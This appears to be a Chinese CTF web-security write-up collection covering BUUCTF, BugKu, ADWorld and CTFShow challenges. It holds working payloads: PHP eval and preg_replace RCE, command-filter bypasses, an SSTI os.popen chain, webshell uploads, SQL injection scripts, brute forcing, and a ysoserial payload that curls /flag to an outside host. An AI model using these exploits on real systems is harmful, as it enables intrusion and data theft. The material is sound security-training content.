Python 3.10.6 (tags/v3.10.6:9c7b4bd, Aug  1 2022, 21:53:49) [MSC v.1932 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> sec = "PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K"
>>> des = base64.b64decode(sec)
>>> print(des)
b'<?php\n$id = $_GET[\'id\'];\n$_SESSION[\'id\'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        \'/(\' . $re . \')/ei\',\n        \'strtolower("\\\\1")\',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). "\\n";\n}\n\nfunction getFlag(){\n\t@eval($_GET[\'cmd\']);\n}\n'
```

![image-20230404105307562](.\Web-CTF\[BJDCTF2020]ZJCTF，不过如此.png)

e模式的preg_replace,有一个远程代码执行漏洞。
思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，所以直接传.\*会无效,将\.\*改成\S*也可以轻松绕过，于是重新构造payload，访问对象此时应该变成next.php了

```
next.php?\S*=${getFlag()}&cmd=system("cat /flag");
```

### [WUSTCTF2020]朴实无华

访问 robots.txt 文件，得到如下内容

```
User-agent: *
Disallow: /fAke_f1agggg.php
```

访问 fAke_f1agggg.php 文件得到 flag{this_is_not_flag}，在F12开发者工具打开时访问 fAke_f1agggg.php 发现了如下信息

![image-20230321212115584](.\Web-CTF\[WUSTCTF2020]朴实无华01.png)

直接进入fl4g.php看见一个朱一丹(2021年过气网红)的表情包？(草)，直接php代码审计一步一步来

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){ #要比2020小 +1比2021大 可以用科学计数法绕过 2e4
	#如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型
        echo "鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.</br>";
    }else{
        die("閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�");
    }
}else{
    die("鍘婚潪娲插惂");
}
//level 2
if (isset($_GET['md5'])){ #md5绕过 因为php具有弱类型，== 在进行比较的时候，会先将字符串类型转化成相同，再比较 
   $md5=$_GET['md5']; #MD5加密后的值要与本身的值相等 下面用脚本跑
   if ($md5==md5($md5))
       echo "鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.</br>";
   else
       die("鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�");
}else{
    die("鍘婚潪娲插惂");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag']; #使用GET提交方法提交一个名为get_flag的参数，提交的参数不能包含空格
    if(!strstr($get_flag," ")){ #system命令输入命令从而得到目录里的flag
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.</br>";
        system($get_flag);
    }else{
        die("蹇埌闈炴床浜�");
    }
}else{
    die("鍘婚潪娲插惂");
}
?>
```

```python
def run():
    i = 0
    while True:
        text = '0e{}'.format(i)
        m = md5(text)
        print(text,m)
        if m[0:2] == '0e' :
            if m[2:].isdigit():
                print('find it:',text,":",m)
                break
        i +=1
run()
#跑出来的值是0e215962017
```

```shell
?num=2e4&md5=0e215962017&get_flag=ls #payload 写入url攻击
#404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt
http://b94f8229-84ef-4e6f-a09e-6bdd57f65c1f.node4.buuoj.cn:81/fl4g.php?num=2e4&md5=0e215962017&get_flag=ca%27%27t$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag #$IFS$9绕过空格 单双引号绕过cat命令过滤
#flag{b9eeaf85-cd88-40ef-b17b-062ea563c64e}
```

### [FBCTF2019] RCEService

```json
{"cmd":"ls"} //index.php 但是访问不到
```

使用HackBar Post执行`cmd={%0A"cmd":"/bin/cat *"%0A}`查到源码

```php
<?php #wp源码

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) { #过滤的非常多...
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

使用脚本回溯次数超出限制，让正则失效：

```python
import requests
payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
res = requests.post("http://ad66432f-4628-41f6-8190-d9b9c247904c.node3.buuoj.cn/", data={"cmd":payload})
print(res.text) #跑完拿到flag
```

 `preg_match()`函数只能匹配第一行数据，可以使用换行符%0a绕过

```json
{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A} //HackBar Post 执行拿下
```

### [极客大挑战 2019]RCE ME

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

```zsh
┌──(root㉿sxylao1)-[/home/sxylao1]
└─# php -r "echo urlencode(~'phpinfo');"
%8F%97%8F%96%91%99%90
```

```url
?code=(~%8F%97%8F%96%91%99%90)();
http://27da83a4-9ac2-4a96-b498-f034d353fba7.node4.buuoj.cn:81/?code=(~%8F%97%8F%96%91%99%90)();
```

构造一句话木马连上蚁剑

```php
<?php 
error_reporting(0);

$a='assert';
$b=urlencode(~$a);
echo $b;

echo "<br>";
$c='(eval($_POST["test"]))';
$d=urlencode(~$c);
echo $d;
 
 ?>
```

```zsh
┌──(root㉿sxylao1)-[/home/sxylao1/Study/Code/PHP]
└─# php urlShell.php                    
%9E%8C%8C%9A%8D%8B<br>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6
```

```
?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);
http://27da83a4-9ac2-4a96-b498-f034d353fba7.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);
```

根目录下可以看到/flag和/readflag两个文件，应该是要通过执行/readflag来获取Flag的
但是执行命令的函数都被禁用了，想到蚁剑有一个绕过disable_functions的插件，正好有PHP7的UAF
AntSword管理界面右键加载辅助插件 选择disable_functions打开PHP_GC_UAF并开始 进入虚拟终端直接拿下(过于脚本小子...)
[[BUUOJ记录\] [极客大挑战 2019]RCE ME - Ye'sBlog - 博客园 (cnblogs.com)](https://www.cnblogs.com/yesec/p/12483631.html)

### [CISCN 2019 初赛] Love Math



### [NESTCTF 2019] Love Math

### [网鼎杯2018]Unfinish

二次注入

```sql
http://9f19e9ee-0947-456e-bf38-e841c7ae3cce.node5.buuoj.cn:81/register.php #先进注册页面 注册先登录进去找修改密码
```

```python
import requests
import re
from time import sleep
from bs4 import BeautifulSoup
 
 
def flag():
    flag = ''
    url = 'http://9f19e9ee-0947-456e-bf38-e841c7ae3cce.node5.buuoj.cn:81/'
    url1 = url + 'register.php'
    url2 = url + 'login.php'
    for i in range(1, 100):
        sleep(0.5)
        data_register = {"email": f"a{i}@163.com",
                 "username": f"0'+ascii(substr((select * from flag) from {i} for 1))+'0;", "password": "1"}
        data_login = {"email": f"a{i}@163.com", "password": "1"}
        response_regiseter = requests.post(url1, data=data_register)
        response_login = requests.post(url2, data=data_login)
        bs = BeautifulSoup(response_login.text, 'html.parser')  # bs4解析页面
        username = bs.find('span', class_='user-name')  # 取返回页面数据的span class=user-name属性
        number = username.text  # 取该属性的数字
        flag += chr(int(number))
        print(flag)
 
 
if __name__ == '__main__':
    flag()
```

### [网鼎杯 2020 朱雀组]Think Java

https://blog.csdn.net/RABCDXB/article/details/124003575

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package cn.abc.core.controller;

import cn.abc.common.bean.ResponseCode;
import cn.abc.common.bean.ResponseResult;
import cn.abc.common.security.annotation.Access;
import cn.abc.core.sqldict.SqlDict;
import cn.abc.core.sqldict.Table;
import io.swagger.annotations.ApiOperation; //发现有swagger接口 可以访问
import java.io.IOException;
import java.util.List;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@CrossOrigin
@RestController
@RequestMapping({"/common/test"})
public class Test {
    public Test() {
    }

    @PostMapping({"/sqlDict"})
    @Access
    @ApiOperation("为了开发方便对应数据库字典查询")
    public ResponseResult sqlDict(String dbName) throws IOException {
        List<Table> tables = SqlDict.getTableData(dbName, "root", "abc@12345");
        return ResponseResult.e(ResponseCode.OK, tables);
    }
}
```

```java
http://url:port/common/test/sqlDict
POST: dbName=myapp?a='union select(select name from user)#' 获取账号
    // { "data":[ { "list":[ { "isAuto":"YES", "isNull":"NO", "isPK":"true", "name":"id", "remark":"", "size":"10", "type":"INT" }, { "isAuto":"NO", "isNull":"YES", "name":"name", "remark":"", "size":"256", "type":"VARCHAR" }, { "isAuto":"NO", "isNull":"YES", "name":"pwd", "remark":"", "size":"256", "type":"VARCHAR" } ], "tableDescribe":"admin", "tableName":"user" } ], "msg":"操作成功", "status":1, "timestamps":1718875796593 }
POST: dbName=myapp?a='union select(select pwd from user)#' 获取密码
    // { "data":[ { "list":[ { "isAuto":"YES", "isNull":"NO", "isPK":"true", "name":"id", "remark":"", "size":"10", "type":"INT" }, { "isAuto":"NO", "isNull":"YES", "name":"name", "remark":"", "size":"256", "type":"VARCHAR" }, { "isAuto":"NO", "isNull":"YES", "name":"pwd", "remark":"", "size":"256", "type":"VARCHAR" } ], "tableDescribe":"admin@Rrrr_ctf_asde", "tableName":"user" } ], "msg":"操作成功", "status":1, "timestamps":1718875775570 }
```

http://url:port/swagger-ui.html
http://url:port/swagger-ui.html#!/36134251433045620851/loginUsingPOST		进入/common/user/login尝试登陆账号密码

```json
{
  "password": "admin@Rrrr_ctf_asde",
  "username": "admin"
}
```

**Response Body**

```json
{
  "data": "Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu", //得到序列化数据
  "msg": "登录成功",
  "status": 2,
  "timestamps": 1718875652855
}
```

进入/common/user/current尝试携带token验证，序列化数据作为token输入，发现返回头验证成功。
尝试利用该漏洞访问dns，验证漏洞是否存在

java -jar  ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://vq1rc2.dnslog.cn" > evil.bin 再运行刚才的py文件base64加密序列化内容

> rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEHZxMXJjMi5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly92cTFyYzIuZG5zbG9nLmNueA==

将payload写入token身份验证，发现dnslog有ip访问证明有漏洞存在
java -jar  ysoserial-0.0.6-SNAPSHOT-all.jar ROME "curl http://sxylao1.asia:4444/ -d @/flag" > flag.bin
监听4444端口即可得到flag

## BugKu

### Simple_SSTI_1

查看源码发现：`<!-- You know, in the flask, We often set a secret_key variable.-->`
模板注入：`/?flag={{config.SECRET_KEY}}`

### Simple_SSTI_2

?flag={{config.\_\_class\_\_\.\_\_init_\_\.\_\_globals\_\_['os'].popen('cat ../app/flag').read()}}

```
config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()
```

[aStrowxyu/ssti-tools: tplmap (github.com)](https://github.com/aStrowxyu/ssti-tools) 模板注入工具

```shell
python2 tplmap.py -u "http://114.67.246.176:12782?flag=1" --os-shell
```

### Flask_FileUpload

查看源码：`<!-- Give me the file, and I will return the Running results by python to you! -->`
告诉了我他会用python来跑这个文件，并且只能传 .jpg / .png的文件，即需要用python写一个图片马

```python
import os
os.system('ls /') #程序运行结果在源码的注释中
```

```python
import os
os.system('cat /flag')
```

### 矛盾

```php
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1) #php弱比较
echo 'flag{**********}';
}
```

```
url/?num=1
```

## ADWorld

[攻防世界 (xctf.org.cn)](https://adworld.xctf.org.cn/home/index)

### Training-WWW-Robots

根据提示进入robots.txt，发现文件名fl0g.php，直接访问拿到`flag`。

### PHP2

从`url`进入`index.phps`，看了wp才知道，`dirsearch`居然没扫到这个文件

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]); #url进入会解码一次 此处会再进行一次url解码 只需要让解码后为admin即可 admin编码两次即可
#admin ==> %61%64%6d%69%6e(字母ASCII) ==> %2561%2564%256d%2569%256e(带上%的ASCII)
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

```
id=%2561%2564%256d%2569%256e 拿下flag
```

phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。
phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。

### ics-07

```php
<?php
    session_start();

    if (!isset($_GET[page])) {
      show_source(__FILE__);
      die();
    }

    if (isset($_GET[page]) && $_GET[page] != 'index.php') {
      include('flag.php');
    }else {
      header('Location: ?page=flag.php');
    }

?>

<?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
?>

<?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
?>
#(1)floatval（$ _ GET [id]）！=='1' //浮点不为1
#(2)substr（$ _ GET [id]，-1）==='9' //id最后一位为9
#(3)Mysql查询结果限制，id不能过大
```

```
index.php?page=&id=1/9&submit=提交查询#
Could not connect: Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)
```

然后是文件过滤，要注意的三个点为：

> (1)$filename = “backup/”.$file; //目录为假目录，传入file时，加上一个…/
> (2)‘/.+.ph(p[3457]?|t|tml)$/i’ //正则过滤文件只匹配最后一个点的后缀，可以写入两次.php
> (3)真实上传目录为upload

构建exp为`file=../123.php/1.php/..&con=<?php passthru($_GET[bash]);?>`,用post方式进行传递
访问`http://111.198.29.45:38479/uploaded/123.php?bash=cat ../flag.php`，查看源码，获得flag，如图所示



## CTFShow

我是从这个网址开始熟练Web-CTF的
如果被收费所劝退的话 还是会想起哈佛校长的一句话 以后你会亲自尝试到无知的代价 更何况只要是自己喜欢的领域 我认为自己花了这一点钱一点都不心疼 还让我学到了很多东西 所以还是根据自己的经济情况量力而行吧

### Web入门

#### 信息搜集

##### web1

```html
view-source:http://8c8e2546-f157-415e-a325-44605778b3c7.challenge.ctf.show/
<!--url中开头写上 veiw-source: 即可查看源码 或者右键查看源码 F12进入开发者模式也可以-->
```

##### web2

查看源代码 通过在url头部添加 view-source:

##### web3

BurpSuite抓包的文件头中得到flag

![image-20230416092337642](.\Web-CTF\CTFshow001.png)

GET	请求指定的页面信息，并返回实体主体
POST	向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和或已有资源的修改
HEAD	类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头
OPTIONS	允许客户端查看服务器的性能
DELETE	请求服务器删除指定的页面
TRACE	回显服务器收到的请求，主要用于测试或诊断
CONNECT 	HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器
PUT	从客户端向服务器传送的数据取代指定的文档的内容
PATCH	是对 PUT 方法的补充，用来对已知资源进行局部更新

Host	表示请求服务器的IP

User_Agent	表示用户本地环境（工具环境）

Accept	浏览器可解析的应用环境

Accept-Language	浏览器可解析的语言类型

Accept-Encoding	浏览器可解析的编码方式

Referer	表示请求页面是从哪里来的（当前所处位置）

Cookie	表示服务器和浏览器之间的会话状态，该会话状态可以表示用户是否登陆过，一般都是服务器给配置的，具有时效性。cookie失效，就需要用户重新登录，只有登录成功之后，浏览器就会保存cookie，每次去服务器去请求都会带上cookie，并且该cookie是需要在服务器中验证的

X-Forwarded-For	表示用户真实的IP

Content-Type	内容类型，表示该请求数据的类型

##### web4

robots.txt是告诉网络爬虫哪些地方不能爬取，其中会有很多信息，比如网站的一些路径。

```python
http://ac0c6954-f449-4237-830e-81e962fb1d4c.challenge.ctf.show/robots.txt #网址
```

```
User-agent: *
Disallow: /flagishere.txt
```

```python
http://ac0c6954-f449-4237-830e-81e962fb1d4c.challenge.ctf.show/flagishere.txt #根据robots.txt的hint得到flag
```

##### web5

phps源码泄露有时候能帮上忙
根据HTTP请求的响应头中的X-Powered-By：PHP/7.3.11 可以得知-网站是用何种语言或框架编写的

```python
http://3601eccf-9eef-4ff3-bfda-d4d1478a944d.challenge.ctf.show/index.phps #得到index.phps文件
```

phps即为 PHP Source。PHP Source 由 The PHP Group 发布，是最通用的关联应用程序。
phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。

##### web6

网站主页源码文件名称为 www.zip ，然后再URL后添加/www.zip对网站主页源码进行下载,然后进行解压

```sh
ls #解药后得到如下文件

        Directory: C:\Users\SxyLao1\Downloads\www


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a---          2020/9/1     14:43             15   fl000g.txt
-a---          2020/9/1     14:42            272   index.php

cat .\index.php #查看源码
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-01 14:37:13
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-01 14:42:44
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
//flag in fl000g.txt #得到提示
echo "web6:where is flag?"
?>
```

```python
http://15daba6c-a67a-44c3-ba2c-8ffb8041c263.challenge.ctf.show/fl000g.txt #进入后得到flag
```

##### web7

版本控制很重要，但不要部署到生产环境更重要。
版本控制器，不是`git泄露`就是`svn泄露`
此题通过访问`/.git/`即可获得`flag`

```python
http://692be7ea-269e-46f1-b253-d14f45cc8e04.challenge.ctf.show/.git/ #进入后得到flag
```

##### web8

版本控制很重要，但不要部署到生产环境更重要。
版本控制器，不是`git泄露`就是`svn泄露`
此题通过访问`/.svn/`即可获得`flag`

```python
http://692be7ea-269e-46f1-b253-d14f45cc8e04.challenge.ctf.show/.svn/ #进入后得到flag
```

##### web9

通过访问`index.php.swp`，访问首页中的交换文件下载缓存文件

程序员使用vim编辑器编写一个`index.php`文件时，会有一个`.index.php.swp`文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的`.swp`文件，而是会生成一个新的，例如`.swo`文件。

恢复文件

> vim -r 恢复的文件名
> 前提是.index.php.swp存在于该目录下

##### web10

根据题目提示在cookie中寻找flag，BurpSuite抓包或者浏览器开发者模式查看

![image-20230416102219112](.\Web-CTF\CTFshow002.png)

![image-20230416102346591](.\Web-CTF\CTFshow003.png)

将cookie得到的flag中的url编码的'%7B %7D'符号分别写为'{ }'即可

##### web11

[域名解析查询(A/Txt/Cname/Mx/Srv/AAAA记录) (infocode.com.cn)](https://www.infocode.com.cn/domain/)

![image-20230416103251561](.\Web-CTF\CTFshow004.png)

##### web12

根据提示在网页最下端找到了公开的信息`372619038`，url进入`admin`路径将其作为admin用户的密码进行登录，得到flag

![image-20230416103745352](.\Web-CTF\CTFshow005.png)

```
http://462388e5-5604-4871-86f0-3ec0f1a12524.challenge.ctf.show/admin/
```

##### web13

![image-20230416104823023](.\Web-CTF\CTFshow006.png)

```
http://1dc329f5-4203-454d-8bf6-577e2028a3bc.challenge.ctf.show/document.pdf
```

![image-20230416104942536](.\Web-CTF\CTFshow007.png)

![image-20230416105111290](.\Web-CTF\CTFshow008.png)

登录完毕后获得flag

##### web14

[hint]小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录

![image-20230416110901906](.\Web-CTF\CTFshow009.png)

```sh
/tmp/html/ #目录下找到了editor文件夹 同级目录下还有个nothinghere文件夹 其中有个fl000g.txt文件
```

![image-20230416110747377](.\Web-CTF\CTFshow010.png)

nothinghere(这儿啥都没有 此地无银三百两)

```
http://d0c0c065-3550-442f-9705-6ed431c30233.challenge.ctf.show/nothinghere/fl000g.txt
```

##### web15

找到邮箱`1156631961@qq.com`，进入`admin`后台，点击忘记密码，要求输入密保问题所在地址。此时搜索该QQ查看资料得到`西安`
重置密码成功得到`admin7789`，并以`admin:admin7789`登录`http://5542f76d-3860-4d29-85f8-702d0044e2eb.challenge.ctf.show/admin/`

##### web16

题目提示`对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露`
通过提示直接访问`tz.php` 

![image-20230416113808735](.\Web-CTF\CTFshow011.png)

![image-20230416113844026](.\Web-CTF\CTFshow012.png)

##### web17

```
http://dbc5dde5-aaaa-4f1d-b18f-57cc5860c42c.challenge.ctf.show/backup.sql
```

```sh
cat backup.sql | grep 'ctfshow{'
```

##### web18

这游戏很难玩到101分，进入查看源码寻找成功的判断条件

```
http://6dabd90b-d37e-4305-b59b-2cc3be1bbb90.challenge.ctf.show/js/Flappy_js.js
```

```javascript
if(score>100)
{
var result=window.confirm("\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b");
} //源码中找到了这一部分
```

[Unicode在线加解密——开发者在线工具,工具猫 (toolscat.com)](https://www.toolscat.com/decode/unicode)

![image-20230416114705693](.\Web-CTF\CTFshow013.png)

根据提示去`110.php`中查看`http://6dabd90b-d37e-4305-b59b-2cc3be1bbb90.challenge.ctf.show/110.php` 得到flag

##### web19

```php
#查看源代码发现如下内容
error_reporting(0);
    $flag="fakeflag"
    $u = $_POST['username'];
    $p = $_POST['pazzword'];
    if(isset($u) && isset($p)){
        if($u==='admin' && $p ==='a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04'){
            echo $flag;
        }
}
```

然后用HackBar进行POST传参拿下本题

![image-20230416151022457](.\Web-CTF\CTFshow014.png)

##### web20

mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。

```
http://0971f58f-b902-4d55-83c2-6e87a51d9c2b.challenge.ctf.show/db/db.mdb
```

![image-20230416151951421](.\Web-CTF\CTFshow015.png)

#### 爆破

##### web21

随便输入账号密码抓包，发现在Authorization 请求头中，输入的admin / admin 以base64的形式传输。

```python
>>> import base64
>>> src = "YWRtaW46YWRtaW4="
>>> des = base64.b64decode(src)
>>> print(des)
b'admin:admin'
```

![image-20230416155125213](.\Web-CTF\CTFshow016.png)

题目中给了爆破的字典 直接拿来用即可，将上图中抓到包发送到Intruder(Send Intruder)。

![image-20230416161556130](.\Web-CTF\CTFshow017.png)

添加后左右两边会出现`§`的字符，点击到payload

![image-20230416161736779](.\Web-CTF\CTFshow018.png)

先给选择Payload类型为`Custom iterator`，第一个参数位置放一个`admin`，Payload set 2添加一个`:`，Payload set 3 Load进一个字典，
因为发送时会将用户输入的账号密码Base64加密后发送，所以爆破时要添加加密：

![image-20230416162659738](.\Web-CTF\CTFshow019.png)

注意一定要将下方的`URL-encode these characters:\=<>?+&*;:"{}^#` 不能给字符加密

![image-20230416162941016](.\Web-CTF\CTFshow020.png)

start attack攻击后 点击状态status进行排序找到唯一爆破成功的选项，点击并base64解密得到`admin:shark63`

##### web22

域名更新后，flag.ctf.show域名失效
所以这道题没法做了。but爆破方式没有太大差别。

[OneForAll域名爆破工具下载链接](https://codeload.github.com/shmilylty/OneForAll/zip/refs/heads/master)

```cmd
python oneforall.py --target [url] run
```

##### web23

用BurpSuite爆破也可以

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);

include('flag.php');
if(isset($_GET['token'])){
    $token = md5($_GET['token']);
    if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
            echo $flag;
        }
    }
}else{
    highlight_file(__FILE__);

}
?>

```

substr()可以从字符串的指定位置截取一定长度的字符，这段被截取的字符可称为“子串”或者“子字符串”
用法如下
substr(string,start,length)
intval()是整型转换函数,用来获取变量的整数值。
int intval ( mixed $var [, int $base = 10 ] )

```php
<?php
    for($i=0;$i<10000;$i++)
    {
    $token=md5($i);
     if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
            if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
                    echo $i;
            }
        }
    }
?> #输出了3j
```

##### web24

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:26:39
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 13:53:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){ #isset()确认是否接收到 返回true false
    $r = $_GET['r'];
    mt_srand(372619038);
